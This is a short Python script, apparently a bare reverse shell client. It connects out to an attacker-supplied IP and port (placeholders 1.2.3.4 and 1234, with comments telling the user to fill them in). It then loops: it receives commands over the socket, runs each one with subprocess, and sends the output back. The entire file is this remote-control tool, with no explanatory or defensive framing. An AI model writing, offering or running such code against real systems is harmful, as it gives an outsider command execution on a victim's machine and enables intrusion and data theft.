import socket
import subprocess

ip = '1.2.3.4' # <- enter string value of ip here
port = 1234 # <- enter int value of port here

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((ip, port))

def run_cmd():
    while True:
        #takes command and executes it
        cmd = s.recv(1024)
        x = str(subprocess.check_output(cmd)).encode()
        #preparing the output to send back
        x = x.decode()
        x = x.replace('\\n','')
        #sending output
        s.send(x.encode())
run_cmd()